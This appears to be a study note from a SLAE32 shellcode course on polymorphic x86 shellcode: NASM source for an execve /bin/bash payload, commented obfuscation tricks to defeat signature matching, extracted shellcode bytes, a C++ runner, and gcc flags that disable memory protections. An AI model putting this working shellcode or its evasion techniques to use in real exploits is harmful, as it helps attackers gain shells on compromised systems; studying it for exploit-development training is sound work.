# POLYMORPHISM

## SHELL (PREP)
In order to understand how `execve` works, look at the arguments it takes, and how this translates to the registers:  

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
**execve does NOT need a return if successful**

```nasm
EAX = syscall
EBX = /bin/bash, 0x0
ECX = Address of /bin/bash, 0x00000000
EDX = 0x00000000
ESI -> /bin/bash
```

## NASM  

### EXECVE  
I have included ways to help obfuscate the shellcode (commented out), but by using obfuscation it makes the shellcode larger.  The compilation assumes non-obfuscated version to keep it small.  

```nasm
; execve-polymorphism.nasm
; SLAE32
; Polymorphism EXECVE using Stack method, no NULL

global _start

section .text
_start: 

    xor eax, eax
    push eax            ; Push 0x00000000 (NULL DWORD)

    ; More obfuscation instead of the above 2 instructions
    ;
    ;   mov ebx, eax                ; Move EAX into EBX
    ;   xor eax, ebx                ; XOR EAX with EBX (which contains the same value) = 0
    ;   mov dword [esp-4], eax      ; == PUSH eax
    ;   sub esp, 4                  ; Fix stack pointer, before moving into next MOV (PUSH) setup for /bin/bash

    
    ; Build the stack using MOV instead of PUSH
    mov dword [esp-4], 0x68736162       ; == push 0x68736162     ; hsab          ////bin/bash - 12 chars, divisible by 4, and NULL terminated ^
    mov dword [esp-8], 0x2f6e6962       ; == push 0x2f6e6962     ; /nib
    mov dword [esp-12], 0x2f2f2f2f      ; == push 0x2f2f2f2f     ; ////

    ; cld       ; BOGUS 1: Able to toss in Bogus instructions like CLD since not using it
    ; This performs a clear direction on strings (go forward, or reverse), but no other strings are being built, so garbage instruction.  

    ; To further obfuscate the above MOV's since they are still plaintext hex values
    ; This will increase the shellcode size...
    ; Use math to rebuild it as follows:
    ;
    ;   mov esi, 0x57625051     
    ;   add esi, 0x11111111         ; 0x57625051 + 0x11111111 == 0x68736162 ( hsab )
    ;   mov dword [esp-4], esi      ; Put the rebuilt value on the stack
    ;   mov esi, 0x1e5d5851
    ;   add esi, 0x11111111         ; 0x1e5d5851 + 0x11111111 == 0x2f6e6962 ( /nib )
    ;   mov dword [esp-8], esi      ; Put the rebuilt value on the stack
    ;   mov esi, 0x1e1e1e1e
    ;   add esi, 0x11111111         ; 0x1e1e1e1e + 0x11111111 == 0x2f2f2f2f ( //// )
    ;   mov dword [esp-12], esi     ; Put the rebuilt value on the stack


    ; std       ; BOGUS 2: Able to toss in Bogus instructions like STD since not using it

    sub esp, 12         ; Adjust the ESP pointer since just modified it above using MOV

    mov ebx, esp        ; MOV address of ////bin/bash string just PUSH'd into EBX

    push eax            ; Push 0x00000000 (NULL DWORD) for EDX prep
    mov edx, esp        ; MOV this null address location in EDX register

    push ebx            ; Save address of WHERE the ////bin/bash,0x0 string is onto stack
    mov ecx, esp        ; MOV address of string into ECX

    mov al, 11          ; 11 (0xB) is execve
    int 0x80
```


---


## Convert to Shellcode  

Use the [compile.sh](../compile.sh) script that will automatically compile, assemble, link, and then print the shellcode for CPP consumption.  


---


## CPP  
### Header file (.h)  
```cpp
/*
Following video: Module 2-12: EXECVE polymorphism

Reference NASM file for even more ways to obfuscate instructions
    /mnt/git/NASM/SLAE32/2-12_Polymorphism/execve-polymorphism:     file format elf32-i386
    Disassembly of section .text:
    08049000 <_start>:
     8049000:       31 c0                   xor    eax,eax
     8049002:       50                      push   eax
     8049003:       c7 44 24 fc 62 61       mov    DWORD PTR [esp-0x4],0x68736162
     8049009:       73 68 
     804900b:       c7 44 24 f8 62 69       mov    DWORD PTR [esp-0x8],0x2f6e6962
     8049011:       6e 2f 
     8049013:       c7 44 24 f4 2f 2f       mov    DWORD PTR [esp-0xc],0x2f2f2f2f
     8049019:       2f 2f 
     804901b:       83 ec 0c                sub    esp,0xc
     804901e:       89 e3                   mov    ebx,esp
     8049020:       50                      push   eax
     8049021:       89 e2                   mov    edx,esp
     8049023:       53                      push   ebx
     8049024:       89 e1                   mov    ecx,esp
     8049026:       b0 0b                   mov    al,0xb
     8049028:       cd 80                   int    0x80
*/

unsigned char shellcode[] = {
"\x31\xc0\x50\xc7\x44\x24\xfc\x62\x61\x73\x68\xc7\x44\x24\xf8\x62"
"\x69\x6e\x2f\xc7\x44\x24\xf4\x2f\x2f\x2f\x2f\x83\xec\x0c\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
};

unsigned int shellcode_len = sizeof(shellcode)-1;
```

### CPP file (.cpp)  
```cpp
#include <stdio.h>
#include <string.h>
#include <stdint.h>		// Requirement for intptr_t/uintptr_t
// @ts-ignore
#include <sys/mman.h>	// Linux requirement for mmap / mprotect

// Clean place to keep all shellcode
#include "shellcode.h"

// Compile (x86) with:
// Note: Requires package gcc-multilib if on an x64 system
// gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
//
// DISABLE ALL PROTECTIONS:
// gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
//
// Compile (x64) with:
// gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>

int main()
{
	for (int i = 0; i < shellcode_len; i++){
		// printf("%02x ",*(shellcode + i));	// Output example: 31 c0 50 68
		printf("\\x%02x",*(shellcode + i));		// Output example: \x31\xc0\x50\x68
	}
	printf("\n");
	printf("Shellcode Length: %d\n", shellcode_len);

	// =====================================================
	// SLAE-32 method
	// Create a function pointer, that points to the raw shellcode, then call the shellcode pointer
	//
	int (*shellcode_func_ptr)() = (int(*)())shellcode;
	mprotect((void*)((uintptr_t)shellcode & ~0xFFF), 8192, PROT_READ|PROT_WRITE|PROT_EXEC);	// Required to add this to make the PAGE the shellcode is in, executable
	printf("Shellcode address: %p\n", shellcode_func_ptr);
	shellcode_func_ptr();
	// =====================================================


	// =====================================================
	// Memory Alloc method
	//
	// int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	// int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	
	// void *shellcode_mem_alloc = mmap(0, shellcode_len, prot, flags, -1, 0);

	// if(shellcode_mem_alloc == MAP_FAILED)
	// {
	// 	perror("mmap");
	// 	return 1;	// Error'd out
	// }
	// else{
	// 	memcpy(shellcode_mem_alloc, shellcode, shellcode_len);
	// 	((void(*)())shellcode_mem_alloc)();
	// }
	// =====================================================


	return 0;
}
```


---

## Compilation (GCC)

### Compile (`x86`):
_Note: Requires package `gcc-multilib` if on an `x64` system_
```shell
gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
```

### DISABLE ALL PROTECTIONS:
```shell
gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
```

### Compile (`x64`):
```shell
gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>
```